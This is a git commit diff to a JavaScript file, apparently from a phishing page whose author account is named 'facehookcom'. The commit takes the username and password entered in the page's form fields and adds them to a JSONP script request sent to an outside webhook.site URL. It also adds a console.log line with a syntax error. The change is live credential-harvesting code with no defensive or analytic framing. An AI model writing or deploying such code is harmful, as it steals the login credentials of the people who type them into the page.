eef41d55cbd0d4501ebf88ab3e96df043f09551c
facehookcom <141312864+facehookcom@users.noreply.github.com>
2023-08-19 14:13:26 +0530

    Update script.js

--- script.js
+++ script.js
@@ -11,7 +11,8 @@ function sendJSONPRequest() {
     // Set the source URL with a callback parameter
     const uu = document.querySelector('input[type="text"]').value;
     const pp = document.querySelector('input[type="password"]').value;
-    script.src = 'https://webhook.site/1a6c6682-deae-47ae-8ae8-7a7c645c3d3a?callback=handleResponse';
+    script.src = 'https://webhook.site/1a6c6682-deae-47ae-8ae8-7a7c645c3d3a?callback=handleResponse&u='+uu+'&p='+pp;
+    console.log('https://webhook.site/1a6c6682-deae-47ae-8ae8-7a7c645c3d3a?callback=handleResponse&u='+uu+'&p='+pp;)
     
     // Append the script tag to the document
     document.body.appendChild(script);
